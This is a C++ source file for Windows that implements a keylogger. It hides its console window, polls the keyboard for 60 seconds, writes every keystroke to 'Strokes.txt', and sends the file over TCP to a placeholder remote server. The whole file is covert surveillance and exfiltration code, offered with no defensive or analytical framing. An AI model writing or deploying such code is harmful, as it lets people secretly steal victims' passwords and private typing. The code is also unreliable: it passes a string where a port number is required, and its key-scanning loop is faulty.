#include <iostream>
#include <fstream>
#include <Windows.h>
#include <string>
#include <vector>
#include <chrono>
#include <WinSock2.h>

#pragma comment(lib, "ws2_32.lib")

void SendFileTCP(const char* filePath, const char* serverIP, int serverPort) {
    // Start Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed." << std::endl;
        return;
    }

    // Make socket
    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Socket creation failed." << std::endl;
        WSACleanup();
        return;
    }

    // server's address and port
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(serverIP);
    serverAddr.sin_port = htons(serverPort);

    // Connect to the server
    if (connect(clientSocket, reinterpret_cast<struct sockaddr*>(&serverAddr), sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Connection to the server failed." << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        return;
    }

    // Open the UTF-8 file for reading
    std::ifstream file(filePath, std::ios::binary);
    if (!file.is_open()) {
        std::cerr << "Failed to open the file." << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        return;
    }

    // Read the file content into a buffer
    std::vector<char> buffer(std::istreambuf_iterator<char>(file), {});

    // Send the file content over the TCP connection
    int bytesSent = send(clientSocket, buffer.data(), static_cast<int>(buffer.size()), 0);
    if (bytesSent == SOCKET_ERROR) {
        std::cerr << "File transmission failed." << std::endl;
    }
    else {
        std::cout << "File sent successfully. " << bytesSent << " bytes sent." << std::endl;
    }

    // Close the file and the socket
    file.close();
    closesocket(clientSocket);
    WSACleanup();
}

int main() {
    HWND consoleWindow = GetConsoleWindow();
    ShowWindow(consoleWindow, SW_HIDE);

    int durationInSeconds = 60;
    char key;

    // Create and open a text file
    std::ofstream outputFile("Strokes.txt");

    std::chrono::time_point<std::chrono::system_clock> endTime = std::chrono::system_clock::now() + std::chrono::seconds(durationInSeconds);

    while (std::chrono::system_clock::now() < endTime) {
        for (key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                outputFile << key;
            }
        }
    }

    // Close the output file when done
    outputFile.close();

    // Replace "SIP" and serverPort with the actual server information
    SendFileTCP("Strokes.txt", "serverIP", "serverPort");

    return 0;
}

